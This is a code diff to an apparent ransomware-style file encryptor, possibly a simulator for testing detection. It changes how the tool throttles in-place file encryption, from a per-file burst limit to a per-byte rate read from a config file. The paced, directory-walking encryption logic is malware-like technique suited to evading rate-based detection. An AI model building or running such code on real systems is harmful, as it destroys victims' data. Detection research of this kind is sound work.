@@ -134,7 +134,13 @@ def modify_file_inplace(file_name, crypto, flag, block_size=16):
     :return: None
     """
     with open(file_name, 'r+b') as f:
-        plaintext = f.read(block_size)
+        plaintext = f.read(block_size)  # read number of bytes
+
+        if flag[1] == "0":  # encrypt
+            config = get_config_from_file()
+            rate = float(config["GENERAL"]["rate"])  # bytes per second
+            bytes_counter = 0
+            enc_start = time()  # time in seconds since epoch
 
         while plaintext:
             cipher = flag[0]
@@ -156,6 +162,16 @@ def modify_file_inplace(file_name, crypto, flag, block_size=16):
 
             f.seek(-len(plaintext), 1)  # return to same point before the read
             f.write(ciphertext)
+
+            if flag[1] == "0":  # encrypt
+                bytes_counter += len(plaintext)
+                enc_running = time() - enc_start  # time in seconds
+                if rate > 0 and rate * enc_running < bytes_counter:  # encryption rate is limited
+                    # if r * b < f then r * (b + n) = f, thus n = f/r - b
+                    even_out = (bytes_counter / rate) - enc_running
+                    print("sleeping for %.5f" % even_out,
+                          "to limit rate - r {} d {} s {}".format(rate, "%.5f" % enc_running, bytes_counter))
+                    sleep(even_out)
 
             if len(ciphertext) < len(plaintext):
                 # since the decrypted text is smaller than the encrypted, the block_size was not reached.
@@ -258,13 +274,6 @@ def encrypt_files(key, start_dirs):
                 # print("File changed from " + file + " to " + encrypted_name)  # keep!
 
                 file_counter += 1
-
-                burst_running = time() - burst_start
-                if rate > 0 and rate * burst_running < file_sizes:  # burst rate is limited
-                    # if r * b < f then r * (b + n) = f, thus n = f/r - b
-                    even_out = (file_sizes / rate) - burst_running
-                    # print("sleeping for", even_out, "to limit rate")
-                    sleep(even_out)
 
                 if duration > 0:  # burst duration is limited
                     reset_burst = False
